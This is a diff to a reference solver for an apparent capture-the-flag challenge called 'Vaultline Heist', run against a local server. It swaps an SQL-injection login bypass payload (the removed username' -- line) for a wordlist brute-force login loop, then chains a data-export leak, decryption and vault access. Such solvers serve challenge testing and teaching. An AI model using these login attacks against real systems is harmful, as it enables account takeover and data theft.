@@ -3,18 +3,19 @@ Vaultline Heist — reference solver / end-to-end tester.
 
 Walks the whole attacker chain against a LIVE server over HTTP:
 
-    SQLi auth-bypass login  ->  data export leak  ->  AES-256 decrypt
+    brute-force login  ->  data export leak  ->  AES-256 decrypt
     ->  rotate password  ->  open vault  ->  read the flag
 
 Usage:
-    python tools/solve.py http://127.0.0.1:8000 <target_username>
+    python tools/solve.py http://127.0.0.1:8000 <target_username> [password]
 
-It uses the SQL-injection path so it needs only the target username (no
-password). Handy as a regression check that the full chain works.
+If a password is given it logs in directly; otherwise it brute-forces
+tools/wordlist.txt to find it. Handy as a regression check for the full chain.
 """
 
 import base64
 import json
+import os
 import sys
 
 import requests
@@ -34,6 +35,7 @@ def aes_decrypt(blob: str, secret: str) -> str:
 
 BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000").rstrip("/")
 USERNAME = sys.argv[2] if len(sys.argv) > 2 else "abraham"
+PASSWORD = sys.argv[3] if len(sys.argv) > 3 else None
 
 s = requests.Session()
 s.headers["Accept"] = "text/html"  # behave like a browser -> redirect + session
@@ -43,11 +45,28 @@ def csrf():
     return s.cookies.get("csrftoken", "")
 
 
-# 1. SQL-injection auth bypass: username = victim' --  (password ignored).
-r = s.post(f"{BASE}/portal/login/",
-           data={"username": f"{USERNAME}' --", "password": "x"}, allow_redirects=False)
-assert r.status_code == 302, f"[1] SQLi login failed: {r.status_code}"
-print("[1] SQLi auth-bypass login  -> OK (session established)")
+# 1. Log in. With a browser Accept header, a correct password returns 302 and
+#    sets the session; a wrong one re-renders the form (200). If no password was
+#    supplied, brute-force the bundled wordlist to find it.
+def portal_login(pw):
+    r = s.post(f"{BASE}/portal/login/",
+               data={"username": USERNAME, "password": pw}, allow_redirects=False)
+    return r.status_code == 302
+
+if PASSWORD:
+    assert portal_login(PASSWORD), "[1] login failed with the given password"
+    print(f"[1] Login                    -> OK (password: {PASSWORD})")
+else:
+    wordlist = os.path.join(os.path.dirname(__file__), "wordlist.txt")
+    found = None
+    with open(wordlist, encoding="latin-1", errors="ignore") as f:
+        for line in f:
+            pw = line.strip()
+            if pw and portal_login(pw):
+                found = pw
+                break
+    assert found, "[1] brute-force did not find the password (wrong wordlist?)"
+    print(f"[1] Brute-force login        -> OK (password: {found})")
 
 # 2. Over-sharing data export.
 export = s.get(f"{BASE}/portal/profile/data/").json()
